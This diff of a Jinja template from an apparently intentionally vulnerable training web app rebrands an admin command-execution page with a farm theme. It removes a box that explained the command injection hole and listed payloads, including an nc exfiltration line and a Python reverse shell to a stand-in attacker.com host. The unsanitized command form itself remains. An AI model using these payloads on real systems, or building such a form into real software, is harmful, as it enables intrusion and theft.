@@ -1,38 +1,23 @@
 {% extends 'base.html' %}
 
-{% block title %}Admin Tools - Vulnerable Web App{% endblock %}
+{% block title %}Barn Tools - Farmers Unite!{% endblock %}
 
 {% block content %}
-<h1>Network Admin Tools</h1>
+<h1>Barn Management Tools</h1>
+<p>Use these special tools to check on your farm's network fences.</p>
 
-<form method="post">
+<form method="post" style="background-color: rgba(139, 69, 19, 0.1); border: 1px dashed #8b4513;">
     <div>
-        <label for="command">Network Diagnostic Command:</label>
+        <label for="command">Farm Network Checker:</label>
         <input type="text" id="command" name="command" placeholder="ping 127.0.0.1" required>
-        <p class="help">Allowed commands: ping, nslookup, traceroute</p>
+        <p style="font-size: 0.9em; color: #666;">Field tools available: ping, nslookup, traceroute</p>
     </div>
-    <button type="submit">Execute</button>
+    <button type="submit">Run Check</button>
 </form>
 
 {% if output %}
-<h2>Command Output</h2>
-<pre style="background-color: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto;">{{ output }}</pre>
+<h2>Field Report</h2>
+<pre
+    style="background-color: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto; border: 1px solid #e9ecef;">{{ output }}</pre>
 {% endif %}
-
-<div style="margin-top: 20px; background-color: #e6f7ff; padding: 10px; border-radius: 5px;">
-    <h3>Command Injection Vulnerability</h3>
-    <p>This tool is vulnerable to command injection attacks because it doesn't properly sanitize user input before
-        executing system commands.</p>
-    <p>Try these examples:</p>
-    <ul>
-        <li><code>ping 127.0.0.1 && whoami</code> - Execute the whoami command after ping</li>
-        <li><code>ping 127.0.0.1; cat /etc/passwd</code> - Display the contents of /etc/passwd</li>
-        <li><code>ping 127.0.0.1 | grep -v "bytes from" | nc attacker.com 4444</code> - Send command output to
-            attacker.com</li>
-        <li><code>ping 127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'</code>
-            - Python reverse shell</li>
-    </ul>
-    <p>Also note that this page lacks proper authorization - any authenticated user can access admin tools, not just
-        admins.</p>
-</div>
 {% endblock %}
